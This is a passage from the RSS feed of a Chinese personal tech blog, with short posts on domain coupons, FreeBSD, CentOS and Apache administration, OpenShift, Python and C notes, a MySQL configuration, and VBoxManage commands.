说明：点击即可享受优惠，无需在输入优惠码！结账时自然优惠！新购买/转移.com域名仅需2.95美元首年！每人限购一个！
有效期：未知 2013年2月27日验证有效！
付款方式：只能信用卡付款！支持国内信用卡购买！
[drpcoupon name=&amp;ldquo;iap295f&amp;rdquo; exclude=&amp;ldquo;name,expiration,description,rss&amp;rdquo;]</description>
    </item>
    
    <item>
      <title>2013年2月GODADDY主机5折优惠码</title>
      <link>http://example.org/2013/02/22/2013-02-godaddy-host-50-cost/</link>
      <pubDate>Fri, 22 Feb 2013 07:45:13 +0000</pubDate>
      
      <guid>http://example.org/2013/02/22/2013-02-godaddy-host-50-cost/</guid>
      <description>godaddy主机2013年2月5折最新优惠码：
godaddy主机2013年2月5折优惠链接
说明：点击即可优惠，无需输入优惠码！
有效期：2013年3月1日前！
或者你也可以使用以下优惠码：
[drpcoupon name=&amp;ldquo;cjcwd50h&amp;rdquo; exclude=&amp;ldquo;name,expiration,description,rss&amp;rdquo;]
说明：点击即可优惠，无需输入优惠码！</description>
    </item>
    
    <item>
      <title>今天把blog迁到了 phpcloud 试用中</title>
      <link>http://example.org/2013/02/21/blog-move-to-phpcloud/</link>
      <pubDate>Thu, 21 Feb 2013 09:39:12 +0000</pubDate>
      
      <guid>http://example.org/2013/02/21/blog-move-to-phpcloud/</guid>
      <description>之前已经介绍过 phpcloud 空间了，也试用过一个站，不过好像被封了，可能是太占资源了哈哈，把 blog 移过过看看会不会被封掉，转移 blog 还是有点麻类的， phpcloud 的 git 权限和apache 权限不致， wordpress 在线更新是比烦的事，改成 777 可以解决，费力呀。。</description>
    </item>
    
    <item>
      <title>在次走进教室</title>
      <link>http://example.org/2012/10/29/again-into-classroom/</link>
      <pubDate>Mon, 29 Oct 2012 05:32:38 +0000</pubDate>
      
      <guid>http://example.org/2012/10/29/again-into-classroom/</guid>
      <description>很早之前就想过回到学校在学点什么，可是自己一直没下定过决心，这次在老婆的一再坚持下，已经托了一周了。。终于帮我报了名，下个月开学，希望顺利毕业</description>
    </item>
    
    <item>
      <title>freebsd6升级到freebsd7</title>
      <link>http://example.org/2012/10/22/upgrading-freebsd6-to-freebsd7/</link>
      <pubDate>Mon, 22 Oct 2012 10:49:26 +0000</pubDate>
      
      <guid>http://example.org/2012/10/22/upgrading-freebsd6-to-freebsd7/</guid>
      <description></description>
    </item>
    
    <item>
      <title>freebsd7升级到freebsd8</title>
      <link>http://example.org/2012/10/22/upgrading-freebsd7-to-freebsd9/</link>
      <pubDate>Mon, 22 Oct 2012 10:44:22 +0000</pubDate>
      
      <guid>http://example.org/2012/10/22/upgrading-freebsd7-to-freebsd9/</guid>
      <description></description>
    </item>
    
    <item>
      <title>freebsd8升级到freebsd9</title>
      <link>http://example.org/2012/10/22/upgrading-freebsd8-to-freebsd9/</link>
      <pubDate>Mon, 22 Oct 2012 10:38:30 +0000</pubDate>
      
      <guid>http://example.org/2012/10/22/upgrading-freebsd8-to-freebsd9/</guid>
      <description></description>
    </item>
    
    <item>
      <title>godaddy开始限制中国用户？</title>
      <link>http://example.org/2012/10/20/godaddy-limit-china/</link>
      <pubDate>Sat, 20 Oct 2012 06:50:04 +0000</pubDate>
      
      <guid>http://example.org/2012/10/20/godaddy-limit-china/</guid>
      <description>最近 godaddy 2.95优惠码 ,5.95优惠码，中国用户支付的时候都会提示
Unfortunately, we are unable to process your purchase using this form of payment. Please utilize another form of payment, or contact (480) 505-8855 for further assistance.
包括刚刚活动的 2.95优惠码还是同样提示。希望这几次只是误伤，不过有同学打电话过去，注册成功，如果你口语还不错，可以试一下。。</description>
    </item>
    
    <item>
      <title>openshift集成了 zend server</title>
      <link>http://example.org/2012/10/13/openshift-zend-server/</link>
      <pubDate>Sat, 13 Oct 2012 09:19:08 +0000</pubDate>
      
      <guid>http://example.org/2012/10/13/openshift-zend-server/</guid>
      <description>今天收到邮 openshift 已经开始支持 zend server 了，这是 openshift 对 php 支持另一种试，强大呀，有兴趣的同学可以去试试，在创建 app 的时候选择 zend server 就可以了。</description>
    </item>
    
    <item>
      <title>GoDaddy .COM域名10月优惠码：2.95美元注册/转入.COM！</title>
      <link>http://example.org/2012/10/12/godaddy-com-promo-code-cjc295v/</link>
      <pubDate>Fri, 12 Oct 2012 07:32:26 +0000</pubDate>
      
      <guid>http://example.org/2012/10/12/godaddy-com-promo-code-cjc295v/</guid>
      <description>GoDaddy 2012年10月份GoDaddy优惠码：2.95美元超低价注册或转入.COM域名！而且不只适用于注册，还适用于从其它注册商将你的域名转入到GoDaddy！无论新老用户均可享受优惠！
[drpcoupon name=&amp;ldquo;godaddy cjc295v&amp;rdquo; exclude=&amp;ldquo;name,expiration,description,rss&amp;rdquo;] （注：此优惠链接已集成GoDaddy 10月优惠码，无需再输入优惠码。有效期未知。）</description>
    </item>
    
    <item>
      <title>GoDaddy .COM域名10月优惠码：5.99美元注册/转入.COM！</title>
      <link>http://example.org/2012/10/12/godaddy-com-promo-code-cjc599v2/</link>
      <pubDate>Fri, 12 Oct 2012 07:20:06 +0000</pubDate>
      
      <guid>http://example.org/2012/10/12/godaddy-com-promo-code-cjc599v2/</guid>
      <description>GoDaddy 2012年10月份GoDaddy优惠码：5.99美元超低价注册或转入.COM域名！而且不只适用于注册，还适用于从其它注册商将你的域名转入到GoDaddy！无论新老用户均可享受优惠！ [drpcoupon name=&amp;ldquo;godaddy cjc599v2&amp;rdquo; exclude=&amp;ldquo;name,expiration,description,rss&amp;rdquo;]
（注：此优惠链接已集成GoDaddy 10月优惠码，无需再输入优惠码。有效期未知。）</description>
    </item>
    
    <item>
      <title>freebsd无线配置静态ip</title>
      <link>http://example.org/2012/09/28/freebsd-wifi-staticip/</link>
      <pubDate>Fri, 28 Sep 2012 17:06:25 +0000</pubDate>
      
      <guid>http://example.org/2012/09/28/freebsd-wifi-staticip/</guid>
      <description>修改 /etc/rc.conf 写入
静态ip
wlans_ath0=&amp;quot;wlan0&amp;quot; ifconfig_wlan0=&amp;quot;WPA inet 192.168.1.100 netmask 255.255.255.0&amp;quot; dhcp 获取
wlans_ath0=&amp;quot;wlan0&amp;quot; ifconfig_wlan0=&amp;quot;WPA DHCP&amp;quot; wpa 配置 /etc/wpa_supplicant.conf
network={ ssid=&amp;quot;YourAPssid&amp;quot; psk=&amp;quot;YourAPpassword&amp;quot; } 完成，可以上网喽</description>
    </item>
    
    <item>
      <title>phpcloud 空间容量更新</title>
      <link>http://example.org/2012/09/25/phpcloud-disk-1000/</link>
      <pubDate>Tue, 25 Sep 2012 02:27:30 +0000</pubDate>
      
      <guid>http://example.org/2012/09/25/phpcloud-disk-1000/</guid>
      <description>之前的 phpcloud 是 500M 空间大小，今天登录管理后台之后发现使用 100M 显示的使用 百分比是 10% 虽然还是写的 500M 空间大小，但按这个比例是 1G, 用探针查看也是 1G 的空间大小，估计官方稍后应该会有公告， 希望 phpcloud 一直活下去，想比 gae 来说，对 php 方面的支持确实不错</description>
    </item>
    
    <item>
      <title>谢孟媛发音篇dvd 百度影音资源</title>
      <link>http://example.org/2012/09/24/home-run-english-fayin-dvd/</link>
      <pubDate>Mon, 24 Sep 2012 11:11:40 +0000</pubDate>
      
      <guid>http://example.org/2012/09/24/home-run-english-fayin-dvd/</guid>
      <description>可以直接用 百度影音播放
bdhd://80654040|4D3E06F13A0E4A3917E1DAAA59B4D51E|谢孟媛发音篇 01.rmvb bdhd://89028156|0C9413020B877B4788540037FD388688|谢孟媛发音篇 02.rmvb bdhd://62356363|A2A87B287DB027C3F6FCC966EC44CB33|谢孟媛发音篇 03.rmvb bdhd://217544457|AA8DD45969E0686E2D1EAD019398D03C|谢孟媛发音篇 04.rmvb bdhd://404379854|162B9A3796BE7B281E963C71D4C382BD|谢孟媛发音篇 05.rmvb bdhd://212526068|AE1F8CC837D6D4707A6B75BF97558615|谢孟媛发音篇 06.rmvb bdhd://213500925|7B0868A82B1E4B0659D15D621692F07C|谢孟媛发音篇 07.rmvb bdhd://344455097|DED586DA24C6843098BFD48E00014241|谢孟媛发音篇 08.rmvb bdhd://319612128|93B006DCDEC05DCE5481B284649799A5|谢孟媛发音篇 09.rmvb bdhd://78418825|D5632B0E7ADF1881AD4EE5ADCBD35833|谢孟媛发音篇 10.rmvb bdhd://82358800|3770F39C1589798E8FBFA2A1B90025C0|谢孟媛发音篇 11.rmvb bdhd://80181405|A30B023595AA50DB110F327AA37B55CA|谢孟媛发音篇 12.rmvb bdhd://7131472|D0FD374C18E88E89B524767C6B464FBA|谢孟媛发音篇 13.rmvb bdhd://96962513|F36CBB7EB1D1A3CD00C12B805FFE0799|谢孟媛发音篇 14.rmvb bdhd://81449222|A33DE32C4F8A2DEF8E2CA22E7808B455|谢孟媛发音篇 15.rmvb bdhd://86806982|042B6DC032562B8174AB18106B821CF3|谢孟媛发音篇 16.rmvb bdhd://39027251|1468C2E8A863E8A61185895539803098|谢孟媛发音篇 17.rmvb bdhd://128430151|427D729C5ED14712C9C6D50B58B4463D|谢孟媛发音篇 18.rmvb bdhd://128993448|6340B9BEE423043E50BD1526A8587964|谢孟媛发音篇 19.rmvb bdhd://124146283|68CC8A684A266B5ED46ED151A67CE22A|谢孟媛发音篇 20.rmvb bdhd://110978378|F79927FC1E96885578FDDE0727B2BB1D|谢孟媛发音篇 21.rmvb bdhd://12418725|B4DD92A962131DD60C8B40794CE0F38D|谢孟媛发音篇 22.rmvb </description>
    </item>
    
    <item>
      <title>从360到百度的提示又更新了</title>
      <link>http://example.org/2012/08/31/360so-to-baidu/</link>
      <pubDate>Fri, 31 Aug 2012 06:44:36 +0000</pubDate>
      
      <guid>http://example.org/2012/08/31/360so-to-baidu/</guid>
      <description>刚才试了一下从360到百度的搜索结果，提示更新成了 喜欢更优质的百度服务吗？把百度设置为主页或把百度添加到桌面吧！ ，第一次看到提示在在百度知道，继续等待新花招 </description>
    </item>
    
    <item>
      <title>今天把eclipse从3.6升到了4.2Juno</title>
      <link>http://example.org/2012/08/28/eclipse-3-6-update-4-2-juno/</link>
      <pubDate>Tue, 28 Aug 2012 15:39:17 +0000</pubDate>
      
      <guid>http://example.org/2012/08/28/eclipse-3-6-update-4-2-juno/</guid>
      <description>做为版本控的我，3.6 的 eclipse 已经很久没更新过了，今天终于更新到了 4.2 正在体验中，附上升级方法
升级到 3.7
1.Window &amp;gt; Preferences &amp;gt; Install/Update &amp;gt; Available Software Sites 2.Click &#39;Add&#39; 3.Enter http://download.eclipse.org/releases/indigo 4.Click &#39;Ok&#39; 升级到4.2
1.Window &amp;gt; Preferences &amp;gt; Install/Update &amp;gt; Available Software Sites 2.Click &#39;Add&#39; 3.Enter http://download.eclipse.org/eclipse/updates/4.2 4.Click &#39;Ok&#39; </description>
    </item>
    
    <item>
      <title>cdnzz 可用邀请码</title>
      <link>http://example.org/2012/08/17/cdnzz-free-invite/</link>
      <pubDate>Fri, 17 Aug 2012 13:31:41 +0000</pubDate>
      
      <guid>http://example.org/2012/08/17/cdnzz-free-invite/</guid>
      <description>cdnzz 有免费用服务，每个用户可以获得 1G 流量，但必须要有邀请码才可以注册，可以使用以下邀请码注册
371297539262 371260853004 371264473296 371294655276 371211066797 371290432236 371248993432 371226353266 371244155333 371212198242</description>
    </item>
    
    <item>
      <title>godaddy 8月份可用的5.99域名优惠</title>
      <link>http://example.org/2012/08/15/godaddy-august-599-coupo/</link>
      <pubDate>Wed, 15 Aug 2012 10:50:28 +0000</pubDate>
      
      <guid>http://example.org/2012/08/15/godaddy-august-599-coupo/</guid>
      <description>godaddy 8月域名注册 5.99 优惠，测试可用，结帐时直接输入。
[drpcoupon name=&amp;ldquo;USAUSA2&amp;rdquo; exclude=&amp;ldquo;name,expiration,description&amp;rdquo;]</description>
    </item>
    
    <item>
      <title>wordpress正在执行例行维护,请一分钟后回来</title>
      <link>http://example.org/2012/08/15/wordpress-maintenance/</link>
      <pubDate>Wed, 15 Aug 2012 02:15:29 +0000</pubDate>
      
      <guid>http://example.org/2012/08/15/wordpress-maintenance/</guid>
      <description>汗呀，刚刚升级个插件，结果 wordpress 打不开了，一直显示 正在执行例行维护,请一分钟后回来,估计是升级出现了问题，在wordpress 安装目录下发现了，.maintenance 这个文件，应该是用于升级记录的文件，先删掉，果然， wordpress 正常了，还是少升级插件的炒哦。。。</description>
    </item>
    
    <item>
      <title>skydrive终于更新界面了，清新多了</title>
      <link>http://example.org/2012/08/15/skydrive-upgrade-outlook/</link>
      <pubDate>Wed, 15 Aug 2012 02:05:31 +0000</pubDate>
      
      <guid>http://example.org/2012/08/15/skydrive-upgrade-outlook/</guid>
      <description>skydrive 是个不错的产品，可惜界面长年不更新，和众多网盘真是有可比性，今天登录 skydrive 突然感觉一下亲切多了，界面升级到和 outlook 的一样了，估计也是为了 windows 8 吧，而且上传速度也有所提升，哈哈，这下用 skydrive 同学有福喽。。</description>
    </item>
    
    <item>
      <title>php 汉字转拼音类 支持音字 声调</title>
      <link>http://example.org/2012/08/12/php-chinese-characters-to-pinyin/</link>
      <pubDate>Sun, 12 Aug 2012 15:51:20 +0000</pubDate>
      
      <guid>http://example.org/2012/08/12/php-chinese-characters-to-pinyin/</guid>
      <description>&lt;p&gt;突然要用到 utf-8 汉字转拼音 ，网上大多都是先把 utf-8 转成 gbk 在转成拼音，太麻烦了，于是自己整理了一份 utf-8 版的，由于找到到的码表问题，部分多音字及声调得到整理，算是比较全的汉字拼音表了。 当然和大多数转换程序一样，还不支持自动多音转换，如 银行可能会转换成 yinxing ，当然了，可以自己控制输出,需要汉字拼音表的可以在程序中提取。&lt;/p&gt;</description>
    </item>
    
    <item>
      <title>Incapsula新加坡节不太稳啦</title>
      <link>http://example.org/2012/08/08/incapsula-gfw/</link>
      <pubDate>Wed, 08 Aug 2012 13:26:52 +0000</pubDate>
      
      <guid>http://example.org/2012/08/08/incapsula-gfw/</guid>
      <description>Incapsula 服务个人觉得非常不错，免费用户都有 50G 的流量 ，一般的小博都够跑了，用了一段时间之后，稳定性方面基本满意，除了发现一次挂了几分钟之外，基本都能正常访问，不过就在今天，打开博客突然无反应了，一想估计是被 gfw 了，但是还想用 Incapsula ，唉， 因为 Incapsula 要检测 cname 所以开始申请的时候直接把域名 cname 到 Incapsula, dns 是用的dnspod 的服务，于是去找了个没有被 gfw 的 ip 直接 A 记录过去，这样的话，国外还是用 cname 国内用 A ，不影响 Incapsula 的检测。。恢复访问。。</description>
    </item>
    
    <item>
      <title>burst 8月份省10% 优惠码</title>
      <link>http://example.org/2012/08/01/2012-08-burst-net-free-10/</link>
      <pubDate>Wed, 01 Aug 2012 06:34:17 +0000</pubDate>
      
      <guid>http://example.org/2012/08/01/2012-08-burst-net-free-10/</guid>
      <description>Burst又称84，是一家比较有名国外VPS主机商。进入8月，再次收到Burst发布的促销邮件，本次优惠码终身9折。
这次Burst优惠码适用于旗下的所有机房的所有类型的vps,包括xen，优惠后一款512MB的OpenVZ每月仅需5.35美元(原价$5.95/月)
[drpcoupon name=&amp;ldquo;BurstNETfree10&amp;rdquo; exclude=&amp;ldquo;name,expiration,description,rss&amp;rdquo;]</description>
    </item>
    
    <item>
      <title>免费的cdn yottaa 已经不存在了</title>
      <link>http://example.org/2012/07/30/free-cdn-yotaa-nonexistent/</link>
      <pubDate>Mon, 30 Jul 2012 03:37:39 +0000</pubDate>
      
      <guid>http://example.org/2012/07/30/free-cdn-yotaa-nonexistent/</guid>
      <description>网络上众多介绍免费的cdn其中的yotaa 现在已经不免费了，只是提供免费的 14天试有而已。 不过去试用了一下，体验还是不错的。</description>
    </item>
    
    <item>
      <title>openshift 绑定域名</title>
      <link>http://example.org/2012/07/29/domain-name-to-openshift/</link>
      <pubDate>Sun, 29 Jul 2012 11:39:08 +0000</pubDate>
      
      <guid>http://example.org/2012/07/29/domain-name-to-openshift/</guid>
      <description>openshift 的自由性真是让人喜欢，不过要绑定域名必须安装 client tools ,ruby的产物，要求 ruby1.8.7以上, freebsd 下安装
安装 ruby
cd /usr/ports/lang/ruby18 make install clean 按装 ruybgames
cd /usr/ports/devel/ruby-gems make install clean rehash 安装 client tools
gem install rhc 绑定域名
rhc setup // 输入用户名密码等 rhc app add-alias -a appName --alias blog.andsky.com // 要确认密码 然后到 app 管理应该会在 Aliases 看到刚刚添加的域名 然后将 blog.andsky.com cname 到 appName-namespace.rhcloud.com</description>
    </item>
    
    <item>
      <title>apache 403 错误 client denied by server</title>
      <link>http://example.org/2012/07/27/apache-403-error-client-denied-by-server/</link>
      <pubDate>Fri, 27 Jul 2012 10:24:35 +0000</pubDate>
      
      <guid>http://example.org/2012/07/27/apache-403-error-client-denied-by-server/</guid>
      <description>由于前段时间给一台服务器在前加了个 nginx 做代理，今天大量用户反应网站出现 403 服务器日志显示 client denied by server 看一下访问日志都是 127.0.0.1 这才想起应该是 apache 防 ddos 模块的问题，把每个 vhost 的链接都当做 一个链接了，先去掉 mod_evasive ,恢复正常，为了上 apache 得到真实 ip 要安装 mod_rpaf 这个模块就 OK 了，
cd /usr/ports/www/mod_rpaf make install clean 安装模块， freebsd 就是让人偷懒呀。编译完成 修改 httpd.conf 打开 mod_rpaf 模块 ，去掉 mod_rpaf 的 # 号, 添加
RPAFenable On RPAFsethostname On RPAFproxy_ips 127.0.0.1 RPAFheader X-Forwarded-For 重起 apache ,终于一切正常了,收工回家.</description>
    </item>
    
    <item>
      <title>buyvm 抽风小记</title>
      <link>http://example.org/2012/07/27/buyvm-e68abde9a38ee5b08fe8aeb0/</link>
      <pubDate>Fri, 27 Jul 2012 02:59:29 +0000</pubDate>
      
      <guid>http://example.org/2012/07/27/buyvm-e68abde9a38ee5b08fe8aeb0/</guid>
      <description>早上打开电脑，访问网站，慢的比蜗牛还慢，ping 测试 丢包 60% 国外线路 ping 正常，应该是到国内的线路抽，幸好用了 cdn ，要不真的比较惨了。</description>
    </item>
    
    <item>
      <title>百度暴风雨之前</title>
      <link>http://example.org/2012/07/11/e799bee5baa6e69ab4e9a38ee99ba8e4b98be5898d/</link>
      <pubDate>Wed, 11 Jul 2012 14:23:16 +0000</pubDate>
      
      <guid>http://example.org/2012/07/11/e799bee5baa6e69ab4e9a38ee99ba8e4b98be5898d/</guid>
      <description>经过6.22，6.28 百度事件之后，按目前来看，今晚要有大更新， 目前发现百度 site 命令波动相当的大，site:cn0314.com 从几百到几万一直在变化， 测试中华网也是 带 www 了只有几百而已，今天才发现，本 blog 百度排名已经消失，不知道什么时候会回来了，慢慢等待。。 准备洗洗睡了，明早起床看百度</description>
    </item>
    
    <item>
      <title>安装 ntop 提示 Missing Dependency: librrd_th.so.2 错误</title>
      <link>http://example.org/2011/09/02/e5ae89e8a385-ntop-e68f90e7a4ba-missing-dependency-librrd_th-so-2-e99499e8afaf/</link>
      <pubDate>Fri, 02 Sep 2011 09:55:49 +0000</pubDate>
      
      <guid>http://example.org/2011/09/02/e5ae89e8a385-ntop-e68f90e7a4ba-missing-dependency-librrd_th-so-2-e99499e8afaf/</guid>
      <description>centos 5.6 x64 安装 ntop 提示以下错误
Resolving Dependencies --&amp;gt; Running transaction check ---&amp;gt; Package ntop.x86_64 0:3.3.9-7.el5 set to be updated --&amp;gt; Processing Dependency: graphviz for package: ntop --&amp;gt; Processing Dependency: librrd_th.so.2()(64bit) for package: ntop --&amp;gt; Processing Dependency: libnetsnmp.so.10()(64bit) for package: ntop --&amp;gt; Processing Dependency: libGeoIP.so.1()(64bit) for package: ntop --&amp;gt; Running transaction check ---&amp;gt; Package geoip.x86_64 0:1.4.6-1.el5.rf set to be updated ---&amp;gt; Package graphviz.x86_64 0:2.22.0-4.el5.rf set to be updated --&amp;gt; Processing Dependency: libXt.</description>
    </item>
    
    <item>
      <title>centos 5.6 x64 同步时间 更改时区</title>
      <link>http://example.org/2011/09/02/centos-5-6-x64-e5908ce6ada5e697b6e997b4-e69bb4e694b9e697b6e58cba/</link>
      <pubDate>Fri, 02 Sep 2011 05:48:00 +0000</pubDate>
      
      <guid>http://example.org/2011/09/02/centos-5-6-x64-e5908ce6ada5e697b6e997b4-e69bb4e694b9e697b6e58cba/</guid>
      <description>ntpdate pool.ntp.org
如无 ntpdate 命令安装 ntp 即可
执行
yum install -y ntp
更改时区
cp /usr/share/zoneinfo/Asia/Shanghai /etc/localtime</description>
    </item>
    
    <item>
      <title>巴菲特推荐的十本书</title>
      <link>http://example.org/2011/03/07/e5b7b4e88fb2e789b9e68ea8e88d90e79a84e58d81e69cace4b9a6/</link>
      <pubDate>Mon, 07 Mar 2011 08:52:28 +0000</pubDate>
      
      <guid>http://example.org/2011/03/07/e5b7b4e88fb2e789b9e68ea8e88d90e79a84e58d81e69cace4b9a6/</guid>
      <description>1、《聪明的投资者》（格雷厄姆著）。格雷厄姆专门为业余投资者所著，巴菲特称之为“有史以来最伟大的投资著作”。 2、《证券分析》（格雷厄姆 多德著）。格雷厄姆的经典名著，专业投资者必读之书，巴菲特认为每一个投资者都应该阅读此书十遍以上。 3、《怎样选择成长股》（费舍尔著）。巴菲特称自己的投资策略是“85%的格雷厄姆和15%的费舍尔”。他说：“运用费舍尔的技巧，可以了解这一行……有助于做出一个聪明的投资决定”。 4、《学以致富》（彼得·林奇著）（如果好他给自己的孙子送生日礼物，《学以致富》是最好不过的了。） 5、《杰克·韦尔奇自传》（杰克·韦尔奇著）（韦尔奇是管理界中的“老虎伍兹”，所有CEO都想效仿他。他们虽然赶不上他，但是如果仔细聆听他所说的话，就能更接近他一些。） 6、《赢》（杰克·韦尔奇著）。（有了《赢》，再也不需要其他管理著作了。） 7、《穷光蛋查理年鉴》（富兰克林著）（一个不幸的灵魂去年问查理：“如果感受不到阅读本书的喜悦，该怎么办？”他得到的芒格式的回答——“没问题，请把这本书赠给更有智慧的人。） 8、《寻找智慧——从达尔文到芒格〉〉》（Reter Bevelin著） 9、《客户的游艇在哪里》（Fred Schweb著）（这是以投资为主题出版过的书中最好的一本，它睿智地阐释了关于投资主题的许多真知灼见。） 10、《巴菲特致股东的信：股份公司教程》。本书搜集整理了20多年巴菲特致股东的信中的精华段落，巴菲特认为此书是整理其投资哲学的一流工作。
转自: http://book.douban.com/review/2914704/</description>
    </item>
    
    <item>
      <title>python运算符与表达式</title>
      <link>http://example.org/2010/03/08/pythone8bf90e7ae97e7aca6e4b88ee8a1a8e8bebee5bc8f/</link>
      <pubDate>Mon, 08 Mar 2010 09:38:01 +0000</pubDate>
      
      <guid>http://example.org/2010/03/08/pythone8bf90e7ae97e7aca6e4b88ee8a1a8e8bebee5bc8f/</guid>
      <description>1.1. 数值操作 所有数值类型都提供下列运算:
运算 描述 x + y 加 x - y 减 x * y 乘 x / y 常规除 x // y 地板除 x ** y 乘方 (xy ) x % y 取模 (x mod y ) -x 改变操作数的符号位 +x 什么也不做 ~x ~x=-(x+1) 关于常规除 / 与地板除 //: 地板除在任何时候都会将小数部分舍为0，而常规除的行为依操作数的类型而有不同。 常规除 / : 整数除以整数时 / 与 // 除完全相同，商都会被舍去小数部分而返回一个整数。如7 / 4 的结果是 1,而不是1.75; 如果有一个操作数为浮点数，情形就不同了： 对于 / ，会返回一个双精度浮点数 对于 //，也会返回一个双精度浮点数，只不过小数部分被舍弃 取模操作返回 x/y 的余数，如7 % 4是3。对于浮点数，取模操作返回的是x - int(x / y ) * y。 对于复数，取模操作返回x - int((x / y ).</description>
    </item>
    
    <item>
      <title>c笔记一</title>
      <link>http://example.org/2010/01/02/ce7ac94e8aeb0e4b880/</link>
      <pubDate>Sat, 02 Jan 2010 13:21:47 +0000</pubDate>
      
      <guid>http://example.org/2010/01/02/ce7ac94e8aeb0e4b880/</guid>
      <description>c的一些笔记 1:声明数组 ,一定要初始化memset(); eg:char buf[12][10]; memset(buf,&amp;rsquo;\0,sizeof(buf)&amp;rsquo;); 2:声明指针，给了值再用（貌似很简单可我犯错了） eg: struct qiao * P; p=(struct qiao *)maloc(sizeof(struct qiao)); p是可以用的。 3;memcpy函数 memcpy(void desc,voidsrc,int num); desc 和src的空间不能重叠，否则会覆盖src的部分值 4:c中的字符串处理; c的字符串用char数组表示，一定要在数组末尾加个&amp;rsquo;\0&#39;;
5:字符串和数值的转换
//把buf的数据放到struct gpsData中 /* *提取年月日 */ gpsData-&amp;gt;year=(int)(atol(buf[8])%100); gpsData-&amp;gt;month=(int)((atol(buf[8])%10000-gpsData-&amp;gt;year)/100); gpsData-&amp;gt;day=(int)(atol(buf[8])/10000); /* *提取时分秒毫秒 */ gpsData-&amp;gt;hour=((int)atof(buf[0]))/10000; gpsData-&amp;gt;second=((int)atof(buf[0]))%100; gpsData-&amp;gt;minute=(((int)atof(buf[0]))%10000-gpsData-&amp;gt;second)/100; gpsData-&amp;gt;minisecond= (int)((long)(atof(buf[0])*1000)%1000); /* *提取经度和纬度 */ char temp[3]; char *tempPoint; memset(temp,&#39;\0&#39;,sizeof(temp)); memcpy(temp,buf[4],2); temp[3]=&#39;\0&#39;; gpsData-&amp;gt;longitude=atoi(temp); tempPoint=buf[4]; gpsData-&amp;gt;m_longitude=atof(tempPoint+2); memcpy(temp,(char *)buf[2],2); temp[3]=&#39;\0&#39;; gpsData-&amp;gt;latitude=atoi(temp); tempPoint=buf[2]; gpsData-&amp;gt;m_latitude=atof(tempPoint+2); 转自 http://kulinglei.javaeye.com/blog/392389</description>
    </item>
    
    <item>
      <title>mysql my.cnf 详解</title>
      <link>http://example.org/2009/12/31/mysql-my-cnf-e8afa6e8a7a3/</link>
      <pubDate>Thu, 31 Dec 2009 04:00:57 +0000</pubDate>
      
      <guid>http://example.org/2009/12/31/mysql-my-cnf-e8afa6e8a7a3/</guid>
      <description>Mysql my.ini 配置文件详解 #BEGIN CONFIG INFO #DESCR: 4GB RAM, 只使用InnoDB, ACID, 少量的连接, 队列负载大 #TYPE: SYSTEM #END CONFIG INFO # # 此mysql配置文件例子针对4G内存 # 主要使用INNODB #处理复杂队列并且连接数量较少的mysql服务器 # # 将此文件复制到/etc/my.cnf 作为全局设置, # mysql-data-dir/my.cnf 作为服务器指定设置 # (@localstatedir@ for this installation) 或者放入 # ~/.my.cnf 作为用户设置. # # 在此配置文件中, 你可以使用所有程序支持的长选项. # 如果想获悉程序支持的所有选项 # 请在程序后加上&amp;quot;&amp;ndash;help&amp;quot;参数运行程序. # # 关于独立选项更多的细节信息可以在手册内找到 # # # 以下选项会被MySQL客户端应用读取. # 注意只有MySQL附带的客户端应用程序保证可以读取这段内容. # 如果你想你自己的MySQL应用程序获取这些值 # 需要在MySQL客户端库初始化的时候指定这些选项 # [client] #password = [your_password] port = @MYSQL_TCP_PORT@ socket = @MYSQL_UNIX_ADDR@ # *** 应用定制选项 *** # # MySQL 服务端 # [mysqld] # 一般配置选项 port = @MYSQL_TCP_PORT@ socket = @MYSQL_UNIX_ADDR@ # back_log 是操作系统在监听队列中所能保持的连接数, # 队列保存了在MySQL连接管理器线程处理之前的连接.</description>
    </item>
    
    <item>
      <title>psyco 真的很神奇</title>
      <link>http://example.org/2009/12/19/psyco-e79c9fe79a84e5be88e7a59ee5a587/</link>
      <pubDate>Sat, 19 Dec 2009 12:15:04 +0000</pubDate>
      
      <guid>http://example.org/2009/12/19/psyco-e79c9fe79a84e5be88e7a59ee5a587/</guid>
      <description>测试代码 http://www.timestretch.com/FractalBenchmark.html#e7142f2f73f8eb4245f1b25aa6340470
没有使用 psyco 3.4 左右，生成 pyc 3.14 ，用了 psyco 0.34 真是太强大了，
freebsd 安装 psyco
cd /usr/ports/devel/py-psyco make install clean 开启
import psyco psyco.full() </description>
    </item>
    
    <item>
      <title>VBoxManage命令详解</title>
      <link>http://example.org/2009/12/17/vboxmanagee591bde4bba4e8afa6e8a7a3/</link>
      <pubDate>Thu, 17 Dec 2009 06:12:35 +0000</pubDate>
      
      <guid>http://example.org/2009/12/17/vboxmanagee591bde4bba4e8afa6e8a7a3/</guid>
      <description>VBoxManage命令详解 本人对vboxmange命令按我个人的理解作了解释，由于本人水平有限难免有错误的地方，希望大家帮我指正。
VBoxManage [-v|-version] 显示virtualbox的版本号 VBoxManage -nologo 隐藏logo VBoxManage -convertSettings 允许自动转换设置文件 VBoxManage -convertSettingsBackup 允许自动转换设置文件，并在转换前作备份 VBoxManage -convertSettingsIgnore 允许自动转换设置文件，但是不保存结果
VBoxManage list vms|runningvms 显示列表虚拟机|正在运行的虚拟机 |ostypes|hostdvds virtualbox支持的系统类型|宿主机的光盘驱动器 |hostfloppies 宿主机的软盘驱动器 |hostifs|hostinfo 宿主机的网络接口|宿主机的信息 |hdds|dvds 已注册的虚拟硬盘|已注册的虚拟光盘 |floppies|usbhost 已注册的虚拟软盘|宿主机的USB设备 |usbfilters USB筛选器 |systemproperties 虚拟机的基本信息
VBoxManage showvminfo | 显示指定虚拟机的信息 [-details] 显示详细信息 [-statistics] 显示统计信息 [-machinereadable] 以清晰的格式显示虚拟机信息
VBoxManage registervm 将指定文件所在的虚拟机添加到列表
VBoxManage unregistervm | 从虚拟机列表清除指定的虚拟机 [-delete] 从虚拟机列表删除指定的虚拟机
VBoxManage createvm -name 创建指定名称的虚拟机 [-register] 将创建的虚拟机添加到列表 [-basefolder 指定虚拟机的基础目录 [-settingsfile ] 指定虚拟机配置文件的基础目录 [-uuid ] 创建指定uuid的虚拟机
